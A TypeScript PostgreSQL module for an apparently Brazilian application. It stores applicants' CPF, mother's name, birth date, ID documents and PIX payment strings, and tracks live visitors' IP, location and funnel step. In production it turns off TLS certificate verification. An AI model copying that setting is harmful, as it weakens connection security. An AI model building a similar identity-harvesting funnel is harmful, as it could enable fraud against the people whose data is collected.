import { Pool } from 'pg';

// Database Schema
export interface Solicitation {
    id: string; // Using CPF as ID
    cpf: string;
    nome: string;
    email: string;
    nascimento: string;
    nome_mae: string;
    num_filhos: number;
    valor: string;
    status: 'pendente' | 'analise' | 'aprovado' | 'rejeitado';
    created_at: string;
    transaction_id?: string;
    pix_copy_paste?: string;
    docs: {
        rg?: string;
        comprovante?: string;
        [key: string]: string | undefined;
    };
    metadata?: any;
}

// PostgreSQL Connection Pool
const pool = new Pool({
    connectionString: process.env.DATABASE_URL,
    ssl: process.env.NODE_ENV === 'production' ? { rejectUnauthorized: false } : undefined
});

// Initialize Database Tables
async function initDB() {
    const client = await pool.connect();
    try {
        // Create solicitations table
        await client.query(`
            CREATE TABLE IF NOT EXISTS solicitations (
                id VARCHAR(11) PRIMARY KEY,
                cpf VARCHAR(14) NOT NULL,
                nome VARCHAR(255) NOT NULL,
                email VARCHAR(255),
                nascimento VARCHAR(10),
                nome_mae VARCHAR(255),
                num_filhos INTEGER DEFAULT 1,
                valor VARCHAR(20),
                status VARCHAR(20) DEFAULT 'pendente',
                created_at VARCHAR(20),
                transaction_id VARCHAR(255),
                pix_copy_paste TEXT,
                docs JSONB DEFAULT '{}',
                metadata JSONB DEFAULT '{}'
            );
        `);

        // Update Sessions Table Schema to include IP and Location
        await client.query(`
            CREATE TABLE IF NOT EXISTS sessions (
                id VARCHAR(255) PRIMARY KEY,
                last_seen TIMESTAMP NOT NULL,
                current_step VARCHAR(50),
                ip VARCHAR(45),
                location VARCHAR(100),
                metadata JSONB DEFAULT '{}'
            );
        `);
        // Migration for existing table
        try {
            await client.query(`ALTER TABLE sessions ADD COLUMN IF NOT EXISTS ip VARCHAR(45)`);
            await client.query(`ALTER TABLE sessions ADD COLUMN IF NOT EXISTS location VARCHAR(100)`);
        } catch (e) { /* ignore if exists */ }

        console.log('[DB] Tables initialized successfully');
    } catch (error) {
        // ...
    } finally {
        client.release();
    }
}

// ... (existing exports)

export async function deleteSolicitation(cpf: string): Promise<boolean> {
    const cleanCPF = cpf.replace(/\D/g, "");
    const client = await pool.connect();
    try {
        await client.query('DELETE FROM solicitations WHERE id = $1', [cleanCPF]);
        return true;
    } catch (error) {
        console.error('[DB] Error deleting solicitation:', error);
        return false;
    } finally {
        client.release();
    }
}

// Session (Online Users) Tracking
export async function updateSession(sessionId: string, step?: string, metadata?: any, ip?: string, location?: string): Promise<void> {
    const client = await pool.connect();
    try {
        let query = `
            INSERT INTO sessions (id, last_seen, current_step, metadata, ip, location) 
            VALUES ($1, NOW(), $2, $3, $4, $5) 
            ON CONFLICT (id) 
            DO UPDATE SET last_seen = NOW()
        `;

        const params: any[] = [
            sessionId,
            step || null,
            metadata ? JSON.stringify(metadata) : '{}',
            ip || null,
            location || null
        ];

        if (step) query += `, current_step = $2`;
        if (metadata) query += `, metadata = $3`;
        if (ip) query += `, ip = $4`;
        if (location) query += `, location = $5`;

        await client.query(query, params);

        // Cleanup old sessions (>10 minutes)
        await client.query(
            `DELETE FROM sessions WHERE last_seen < NOW() - INTERVAL '10 minutes'`
        );
    } catch (error) {
        console.error('[DB] Error updating session:', error);
    } finally {
        client.release();
    }
}

export async function getActiveSessions(): Promise<any[]> {
    const client = await pool.connect();
    try {
        const result = await client.query(
            `SELECT id, current_step, last_seen, metadata, ip, location 
             FROM sessions 
             WHERE last_seen > NOW() - INTERVAL '5 minutes'
             ORDER BY last_seen DESC`
        );
        return result.rows;
    } catch (error) {
        console.error('[DB] Error fetching active sessions:', error);
        return [];
    } finally {
        client.release();
    }
}

export async function trackEvent(sessionId: string, step: string, metadata?: any): Promise<void> {
    const client = await pool.connect();
    try {
        await client.query(
            `INSERT INTO analytics_events (session_id, step, metadata) VALUES ($1, $2, $3)`,
            [sessionId, step, metadata ? JSON.stringify(metadata) : '{}']
        );
    } catch (error) {
        console.error('[DB] Error tracking event:', error);
    } finally {
        client.release();
    }
}

export async function getOnlineUsersCount(): Promise<number> {
    const client = await pool.connect();
    try {
        const result = await client.query(
            `SELECT COUNT(*) FROM sessions WHERE last_seen > NOW() - INTERVAL '5 minutes'`
        );
        return parseInt(result.rows[0].count, 10);
    } catch (error) {
        console.error('[DB] Error counting online users:', error);
        return 0;
    } finally {
        client.release();
    }
}

export async function getAnalyticsStats(): Promise<{ step: string, count: number }[]> {
    const client = await pool.connect();
    try {
        // Count unique users per step in the last 24 hours
        const result = await client.query(
            `SELECT step, COUNT(DISTINCT session_id) as count 
             FROM analytics_events 
             WHERE created_at > NOW() - INTERVAL '24 hours'
             GROUP BY step`
        );
        return result.rows.map(row => ({
            step: row.step || 'unknown',
            count: parseInt(row.count, 10)
        }));
    } catch (error) {
        console.error('[DB] Error fetching analytics:', error);
        return [];
    } finally {
        client.release();
    }
}
